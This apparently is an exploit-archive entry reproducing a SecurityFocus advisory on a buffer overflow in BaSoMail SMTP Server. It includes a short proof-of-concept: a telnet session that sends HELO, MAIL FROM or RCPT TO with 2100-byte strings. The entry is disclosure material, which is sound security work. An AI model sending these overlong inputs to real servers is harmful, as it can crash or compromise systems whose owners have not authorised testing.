@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/7726/info
+
+BaSoMail SMTP Server has been reported prone to a buffer overflow vulnerability.
+
+The issue is likely due to a lack of sufficient bounds checking performed on arguments passed to SMTP commands.
+
+Although unconfirmed and speculative, due to the nature of this vulnerability, it may be possible to exploit this issue to execute arbitrary attacker supplied code. 
+
+# Telnet The_SMTP_Server_IP_Address 25
+220 Welcome to BaSoMail (www.BaSo.no)
+HELO <ccccc....[Buffer size 2100 Bytes]>
+Or
+Mail From : <ccccc....[Buffer size 2100 Bytes @xyz.com]>
+Or
+Rcpt to : <ccccc....[Buffer size 2100 Bytes @xyz.com]>
+Quit 
